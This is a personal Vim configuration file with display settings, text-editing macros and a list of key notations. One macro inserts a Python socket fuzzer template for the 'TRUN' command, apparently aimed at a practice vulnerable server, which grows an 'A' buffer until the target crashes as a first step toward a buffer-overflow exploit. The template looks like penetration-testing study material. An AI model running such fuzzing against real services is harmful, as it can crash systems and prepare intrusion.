syntax enable
set number
set mouse-=a
colorscheme elflord
let @f="i#!/usr/bin/python\<CR>import sys,socket\<CR>from time import sleep\<CR>\<CR>buffer = 'A' * 1500\<CR>sploitArg = 'TRUN /.../'\<CR>host = \"\"\<CR>port = 34\<CR>buffer = ()\<CR>\<CR>while True:\<CR>\<TAB>try:\<CR>\<TAB>\<TAB>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\<CR>\<TAB>\<TAB>s.connect((host,port))\<CR>\<TAB>\<TAB>#send buffer\<CR>\<TAB>\<TAB>s.send((sploitArg + buffer))\<CR>\<TAB>\<TAB>#recieve buffer\<CR>\<TAB>\<TAB>s.recv(1024)\<CR>\<TAB>\<TAB>sleep(1)\<CR>\<TAB>\<TAB>s.close()\<CR>\<TAB>\<TAB>buffer += 'A'*100\<CR>\<TAB>\<TAB>print \"sending %s bytes\" % str(len(buffer))\<CR>\<CR>\<TAB>except:\<CR>\<TAB>\<TAB>print \" fuzzing crashed at %s bytes\" % str(len(buffer))"

let @p=":%s/=/\":\"/g:%s/&/\", \"/g"

let @l="^i{\"\<Esc>$a\"}"


let @t="@l\<Esc>@p"



"<BS>           Backspace
"<Tab>          Tab
"<CR>           Enter
"<Enter>        Enter
"<Return>       Enter
"<Esc>          Escape
"<Space>        Space
"<Up>           Up arrow
"<Down>         Down arrow
"<Left>         Left arrow
"<Right>        Right arrow
"<F1> - <F12>   Function keys 1 to 12
"#1, #2..#9,#0  Function keys F1 to F9, F10
"<Insert>       Insert
"<Del>          Delete
"<Home>         Home
"<End>          End
"<PageUp>       Page-Up
"<PageDown>     Page-Down
"<bar>          the '|' character, which otherwise needs to be escaped '\|'
